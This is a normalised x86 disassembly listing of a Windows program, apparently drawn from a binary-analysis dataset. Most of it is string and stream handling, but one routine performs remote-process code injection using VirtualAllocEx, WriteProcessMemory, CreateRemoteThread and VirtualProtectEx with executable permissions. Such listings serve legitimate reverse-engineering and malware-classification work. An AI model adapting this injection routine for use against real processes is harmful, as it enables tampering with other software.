ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_437cb3
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_43c3a5
lea eax [ ecx * 8 ]
sub eax ecx
add eax eax
add eax eax
push eax
call sub_438178
add esp 0x4
test eax eax
jne r-xdata
sub_406270
push ebp
mov ebp esp
push 0xffffffff
push sub_4523e1
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0xc ]
mov edi ecx
xor ebx ebx
lea ecx [ ecx ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp esi ebx
je r-xdata
add esi 0x1c
add edi 0x1c
jmp r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
cmp esi edi
je r-xdata
cmp edi [ ebp + 0x8 ]
je r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
cmp [ edi + 0x14 ] 0x10
jae r-xdata
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x4
mov eax [ edi ]
mov [ esi ] eax
mov [ edi ] ebx
mov eax [ edi + 0x10 ]
inc eax
push eax
push edi
push esi
call sub_437db0
add esp 0xc
jmp r-xdata
mov ecx [ edi + 0x10 ]
mov [ esi + 0x10 ] ecx
mov edx [ edi + 0x14 ]
mov [ esi + 0x14 ] edx
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] ebx
mov [ edi ] bl
sub_406330
push ebp
mov ebp esp
push 0xffffffff
push sub_4523a8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
xor esi esi
mov edi ecx
mov [ ebp - 0x2c ] ax
push esi
mov eax r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x2d ] 0x0
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] esi
call sub_401c90
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx edi
mov [ ebp - 0x4 ] esi
call sub_40e3f0
add esp 0x4
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
mov al [ ebp - 0x2d ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x2c ]
push eax
call sub_43811c
add esp 0x4
push esi
push esi
push 0x3
push esi
push 0x1
push esi
push eax
call [ CreateFileW@IAT ]
cmp eax esi
je r-xdata
lea eax [ ebp - 0x2c ]
call [ GetLastError@IAT ]
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov esi [ ebp - 0x1c ]
mov eax [ ebx ]
push 0x40
push 0x1000
lea esi [ esi + esi + 0x2 ]
push esi
push 0x0
push eax
call [ VirtualAllocEx@IAT ]
mov edi eax
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
push eax
mov eax [ ebx ]
call sub_406560
add esp 0x4
test al al
je r-xdata
lea eax [ ebp - 0x2c ]
mov edx [ ebx ]
push 0x8000
push 0x0
push edi
push edx
call [ VirtualFreeEx@IAT ]
push r--data
push r--data
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
push r--data
push r--data
mov esi eax
mov [ ebp - 0x34 ] 0xffffffff
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
mov eax [ ebx ]
push 0x0
push 0x0
push edi
push esi
push 0x0
push 0x0
push eax
call [ CreateRemoteThread@IAT ]
mov [ ebp - 0x34 ] eax
push r--data
push r--data
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov edx [ ebx ]
push 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push edi
push esi
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push edx
call eax
push eax
call [ SetLastError@IAT ]
mov eax [ ebp - 0x34 ]
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
test eax eax
je r-xdata
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
mov ecx [ ebp - 0x34 ]
push ecx
mov [ ebp - 0x2d ] 0x1
call [ CloseHandle@IAT ]
sub_406510
push ebp
mov ebp esp
push ecx
cmp eax 0xffffffff
jne r-xdata
push edi
lea edi [ ebp - 0x4 ]
push edi
push esi
push ecx
push edx
push eax
mov [ ebp - 0x4 ] 0x0
call [ ReadProcessMemory@IAT ]
pop edi
test eax eax
je r-xdata
push esi
push edx
push esi
push ecx
call sub_438acf
add esp 0x10
neg eax
sbb eax eax
inc eax
mov esp ebp
pop ebp
retn
xor eax eax
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] esi
jne r-xdata
mov eax 0x1
mov esp ebp
pop ebp
retn
sub_406560
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push 0x40
push esi
push edi
push ebx
call [ VirtualProtectEx@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x40
push esi
push edi
call [ VirtualProtect@IAT ]
test eax eax
je r-xdata
xor al al
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
lea edx [ ebp - 0xc ]
push edx
push esi
push eax
push edi
push ebx
mov [ ebp - 0xc ] 0x0
call [ WriteProcessMemory@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push esi
push ecx
push esi
push edi
call sub_438acf
add esp 0x10
test eax eax
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x10 ]
push edx
push eax
push esi
push edi
sete bl
call [ VirtualProtect@IAT ]
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0x1 ] 0x1
cmp [ ebp - 0xc ] esi
je r-xdata
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x10 ]
push ecx
push edx
push esi
push edi
push ebx
call [ VirtualProtectEx@IAT ]
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_406610
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
call sub_435b34
mov esi [ ebp + 0x14 ]
mov ebx eax
mov eax [ ebp + 0x8 ]
add esp 0x4
mov [ ebp - 0x8 ] ebx
mov [ esi ] eax
mov [ ebp + 0xb ] 0x1
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xb ] 0x0
je r-xdata
mov ecx [ esi ]
add ecx edi
cmp eax ecx
sbb eax eax
inc eax
je r-xdata
push ebx
call sub_438111
mov al [ ebp - 0x1 ]
add esp 0x4
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ esi ] 0x0
mov ecx [ ebp + 0x18 ]
mov eax [ esi ]
cmp ecx 0xffffffff
jne r-xdata
lea edx [ ebp + 0x8 ]
push edx
push edi
push ebx
push eax
push ecx
mov [ ebp + 0x8 ] 0x0
call [ ReadProcessMemory@IAT ]
test eax eax
je r-xdata
push edi
push eax
push edi
push ebx
call sub_438acf
add esp 0x10
test eax eax
sete al
mov [ ebp + 0xb ] al
test al al
je r-xdata
mov [ ebp + 0xb ] 0x0
jmp r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov esi edi
mov edx ebx
cmp edi 0x4
jb r-xdata
mov [ ebp + 0xb ] 0x1
jmp r-xdata
test esi esi
je r-xdata
lea esp [ esp ]
xor eax eax
movzx eax [ edx ]
movzx ebx [ ecx ]
sub eax ebx
jne r-xdata
sub esi 0x4
add ecx 0x4
add edx 0x4
cmp esi 0x4
jae r-xdata
mov esi [ ebp + 0x14 ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
inc [ eax ]
mov esi eax
jmp r-xdata
mov ebx [ ebp - 0x8 ]
sar eax 0x1f
or eax 0x1
jmp r-xdata
cmp esi 0x1
jbe r-xdata
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
test eax eax
sete al
mov [ ebp - 0x1 ] al
test al al
jne r-xdata
mov ebx [ ebp - 0x8 ]
movzx eax [ edx + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub eax ebx
jne r-xdata
cmp esi 0x2
jbe r-xdata
movzx eax [ edx + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub eax ebx
jne r-xdata
cmp esi 0x3
jbe r-xdata
movzx eax [ edx + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
sub_406770
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
movzx esi ax
mov eax esi
shl esi 0x10
push edi
or eax esi
shr ecx 0x1
mov edi edx
[ edi ]
adc ecx ecx
[ edi ]
pop edi
mov eax edx
pop esi
pop ebp
retn
sub_4067d0
push ebp
mov ebp esp
push 0xffffffff
push sub_452c05
mov eax [ fs : 0x0 ]
push eax
sub esp 0x124
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
mov ebx edx
mov [ ebp - 0x84 ] esi
mov [ ebp - 0x88 ] ebx
mov [ ebx ] esi
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] esi
mov eax 0x1
xor edx edx
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] dx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x130 ]
push eax
call sub_406af0
lea ecx [ ebp - 0x2c ]
push ecx
lea edx [ ebp - 0x130 ]
push edx
mov [ ebp - 0x4 ] 0x2
call sub_406e40
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + eax + 0xc ]
add ecx eax
and dl 0x6
movsx eax dl
add esp 0x8
neg eax
sbb eax eax
not eax
lea edi [ esi + 0x8 ]
test ecx eax
je r-xdata
lea ecx [ ebp - 0x130 ]
mov [ ebp - 0x4 ] 0x1
call sub_403550
cmp [ ebp - 0x18 ] edi
jb r-xdata
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x2c ]
mov eax ecx
cmp edx edi
jae r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x2c ]
push ecx
call sub_43811c
add esp 0x4
cmp [ eax ] 0x22
jne r-xdata
lea eax [ ebp - 0x2c ]
lea ecx [ ebp - 0x2c ]
call sub_4039d0
cmp edx edi
jae r-xdata
mov eax [ ebp - 0x1c ]
cmp [ ecx + eax * 2 - 0x2 ] 0x22
jne r-xdata
lea ecx [ ebp - 0x2c ]
xor edx edx
mov [ ebp - 0x50 ] 0x7
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x64 ] dx
lea eax [ ebp - 0x130 ]
push 0x22
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x4
call sub_407070
add esp 0x8
push 0xffffffff
mov ecx 0x1
lea eax [ ebp - 0x80 ]
lea edx [ ebp - 0x2c ]
call sub_406a90
mov edx eax
lea eax [ ebp - 0x64 ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x5
call sub_406d50
mov ecx eax
mov [ ebp - 0x4 ] 0x6
call sub_401b00
cmp [ ebp - 0x34 ] edi
jb r-xdata
add eax 0xfffffffe
push eax
mov ecx 0x1
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x2c ]
call sub_406a90
mov ecx eax
mov [ ebp - 0x4 ] 0x3
call sub_401b00
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x34 ] edi
jb r-xdata
xor edx edx
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] dx
cmp [ ebp - 0x6c ] edi
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_43811c
add esp 0x4
lea edx [ ebp - 0x2c ]
push edx
lea eax [ ebp - 0x130 ]
push eax
call sub_406e40
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + eax + 0xc ]
add ecx eax
and dl 0x6
movsx eax dl
add esp 0x8
neg eax
sbb eax eax
not eax
test ecx eax
jne r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_43811c
add esp 0x4
jmp r-xdata
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov eax [ ebp - 0x80 ]
push eax
call sub_43811c
add esp 0x4
mov ecx [ ebp - 0x64 ]
push ecx
call sub_43811c
add esp 0x4
jmp r-xdata
sub_406a00
push esi
mov esi eax
mov eax [ esi + 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x1c ]
mov ecx esi
call edx
movzx eax ax
mov ecx [ esi + 0x30 ]
cmp [ ecx ] 0x1
jle r-xdata
mov eax [ esi + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov eax ecx
pop esi
retn
test eax eax
je r-xdata
mov eax ecx
dec [ eax ]
mov esi [ esi + 0x20 ]
mov eax [ esi ]
add eax 0x2
mov [ esi ] eax
movzx eax [ eax ]
pop esi
retn
mov edx [ esi ]
mov eax [ edx + 0x18 ]
mov ecx esi
call eax
movzx eax ax
movzx eax ax
pop esi
retn
mov edx [ esi + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov edx [ esi + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov eax [ eax ]
movzx eax [ eax ]
movzx eax ax
pop esi
retn
mov eax edx
dec [ eax ]
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
lea edx [ ecx + 0x2 ]
mov [ eax ] edx
movzx eax [ ecx ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
sub_406a90
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
xor eax eax
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] 0x7
push ecx
mov [ ebp - 0x4 ] eax
mov [ edi ] ax
mov eax [ ebp + 0x8 ]
push edx
call sub_401be0
mov eax edi
pop edi
mov esp ebp
pop ebp
retn 0x4
sub_406ac0
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
retn
push edi
mov edi [ esi + 0x4 ]
call sub_402330
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x4
pop edi
sub_406af0
push ebp
mov ebp esp
push 0xffffffff
push sub_45252f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov edi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ edi ] r--data
mov [ edi + 0x10 ] r--data
mov [ edi + 0x60 ] r--data
lea esi [ edi + 0x18 ]
push esi
mov [ ebp - 0x4 ] eax
push edi
mov [ ebp - 0x10 ] 0x1
call sub_4043f0
mov [ ebp - 0x4 ] 0x1
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] r--data
mov ecx esi
mov [ ebp - 0x14 ] esi
call sub_4047b0
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
cmp [ ebx + 0x14 ] 0x8
mov eax [ ebx + 0x10 ]
jb r-xdata
xor ecx ecx
mov [ esi + 0x3c ] ecx
mov [ esi + 0x40 ] ecx
cmp eax ecx
je r-xdata
mov ebx [ ebx ]
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push ebx
call sub_4048d0
sub_406bb0
push ebp
mov ebp esp
push 0xffffffff
push sub_451a18
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx + esi + 0xc ]
add ecx esi
test eax eax
jne r-xdata
mov eax [ ecx + 0xc ]
or eax 0x2
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x3c ]
test ecx ecx
je r-xdata
push 0x0
push eax
call sub_402d50
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
or eax 0x4
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_403670
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
cmp [ ecx + 0xc ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx [ edx + esi + 0x14 ]
test cl 0x1
je r-xdata
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea ecx [ ebp + 0xc ]
push ecx
lea ecx [ esi + edx ]
call sub_402e50
push eax
mov [ ebp - 0x4 ] 0x0
call sub_404ad0
add esp 0x4
lea ecx [ ebp + 0xc ]
mov edi eax
call sub_402840
mov [ ebp - 0x4 ] 0x1
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x18 ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov edx [ edi ]
push eax
mov eax [ edx + 0x8 ]
push 0x48
mov ecx edi
call eax
test al al
jne r-xdata
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
mov eax [ ecx + esi + 0xc ]
add ecx esi
or eax 0x1
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + esi + 0x38 ]
call sub_406a00
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x0
push eax
call sub_402d50
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
or eax 0x4
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
sub_406ccc
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_402d50
mov [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
or eax 0x4
sub_406d50
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x0
push eax
or eax 0xffffffff
mov edi edx
mov esi ecx
mov [ ebp - 0x4 ] 0x0
call sub_406d90
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov edi eax
mov [ esi ] cx
call sub_4023e0
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_406d90
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax ecx
jae r-xdata
sub eax ecx
cmp eax ebx
jae r-xdata
push r--data
call sub_435ac6
mov eax [ edi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ebx eax
test ebx ebx
je r-xdata
push r--data
call sub_435a79
mov eax edi
pop ebx
pop ebp
retn 0x8
push esi
lea esi [ eax + ebx ]
mov eax edi
call sub_401ef0
test al al
je r-xdata
pop esi
mov ecx [ ebp + 0x8 ]
mov eax 0x8
cmp [ ecx + 0x14 ] eax
jb r-xdata
cmp [ edi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
xor ecx ecx
mov [ eax + esi * 2 ] cx
mov eax [ edi ]
xor ecx ecx
mov [ eax + esi * 2 ] cx
pop esi
mov eax edi
pop ebx
pop ebp
retn 0x8
lea edx [ ebx + ebx ]
push edx
mov edx [ ebp + 0xc ]
lea ecx [ ecx + edx * 2 ]
mov edx [ edi + 0x10 ]
push ecx
lea eax [ eax + edx * 2 ]
push eax
call sub_43a8a0
add esp 0xc
cmp [ edi + 0x14 ] 0x8
mov [ edi + 0x10 ] esi
jb r-xdata
sub_406e40
push ebp
mov ebp esp
push 0xffffffff
push sub_452378
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x38 ]
xor esi esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x2c ] edi
cmp ecx esi
je r-xdata
push esi
push edi
mov [ ebp - 0x4 ] esi
call sub_406bb0
mov [ ebp - 0x28 ] al
mov [ ebp - 0x4 ] 0x1
test al al
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov edx [ edi ]
mov eax [ edx + 0x4 ]
xor ebx ebx
mov [ eax + edi + 0x20 ] ebx
mov [ eax + edi + 0x24 ] ebx
cmp [ ebp - 0x11 ] bl
jne r-xdata
mov edx [ edi ]
lea ecx [ ebp - 0x1c ]
push ecx
mov ecx [ edx + 0x4 ]
add ecx edi
call sub_402e50
push eax
mov [ ebp - 0x4 ] 0x2
call sub_404ad0
mov [ ebp - 0x4 ] 0x1
mov ebx [ ebp - 0x1c ]
add esp 0x4
mov [ ebp - 0x24 ] eax
test ebx ebx
je r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
add ecx edi
cmp esi ebx
je r-xdata
or esi 0x2
mov esi [ ebp + 0xc ]
or eax 0xffffffff
xor ecx ecx
call sub_401e70
mov [ ebp - 0x4 ] 0x3
mov eax [ edi ]
mov edx [ eax + 0x4 ]
mov ecx [ edx + edi + 0x24 ]
mov eax [ edx + edi + 0x20 ]
test ecx ecx
jl r-xdata
push 0x0
lea ecx [ ebp - 0x20 ]
call sub_436188
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x2c ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx + eax + 0x38 ]
cmp ecx ebx
je r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov esi 0x7ffffffe
jg r-xdata
mov esi [ ebx + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x20 ]
not esi
call sub_4361b0
and esi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
push ebx
push eax
call sub_402d50
or eax 0x4
mov eax [ ecx ]
mov edx [ eax + 0x18 ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebp - 0x34 ] ecx
cmp eax 0x7ffffffe
jae r-xdata
test eax eax
je r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ ebx + 0x4 ] eax
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax 0xffff
cmp ax bx
jne r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ebp - 0x34 ] ecx
mov esi eax
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov ecx [ ebp - 0x24 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
push ebx
push 0x48
call eax
test al al
jne r-xdata
or [ ebp - 0x18 ] 0x1
movzx ebx ax
mov ecx [ edx + edi + 0x38 ]
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edi [ ebp + 0xc ]
call sub_4072e0
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax + 0x38 ]
mov [ ebp - 0x11 ] 0x1
dec esi
call sub_406a00
mov edi [ ebp + 0x8 ]
movzx eax ax
mov ebx eax
jmp r-xdata
test esi esi
je r-xdata
sub_406fc8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_402d50
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_407070
push ebp
mov ebp esp
push 0xffffffff
push sub_452340
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x38 ]
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x11 ] bl
mov [ ebp - 0x20 ] edi
test ecx ecx
je r-xdata
push 0x1
push edi
mov [ ebp - 0x4 ] 0x0
call sub_406bb0
mov [ ebp - 0x1c ] al
mov [ ebp - 0x4 ] 0x1
test al al
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
or ebx 0x2
or eax 0xffffffff
xor ecx ecx
mov [ ebp - 0x4 ] 0x2
call sub_401e70
mov ecx [ edi ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx + edi + 0x38 ]
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx + eax + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x18 ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
push 0x0
push eax
call sub_402d50
or eax 0x4
movzx ecx [ ebp + 0xc ]
cmp ax cx
jne r-xdata
or ebx 0x1
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
cmp [ esi + 0x10 ] 0x7ffffffe
jb r-xdata
mov edx [ edi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + edi + 0x38 ]
mov edx [ ecx + 0x20 ]
cmp [ edx ] 0x0
mov [ ebp - 0x11 ] 0x1
je r-xdata
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov ebx eax
mov edi esi
call sub_4072e0
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax + 0x38 ]
mov [ ebp - 0x11 ] 0x1
call sub_406a00
mov ebx [ ebp - 0x18 ]
mov edi [ ebp + 0x8 ]
jmp r-xdata
or ebx 0x2
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x1c ]
call eax
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax [ ecx + 0x30 ]
cmp [ eax ] 0x0
jle r-xdata
mov edx [ edi ]
mov ecx [ edx + 0x4 ]
add ecx edi
test ebx ebx
je r-xdata
dec [ eax ]
mov ecx [ ecx + 0x20 ]
add [ ecx ] 0x2
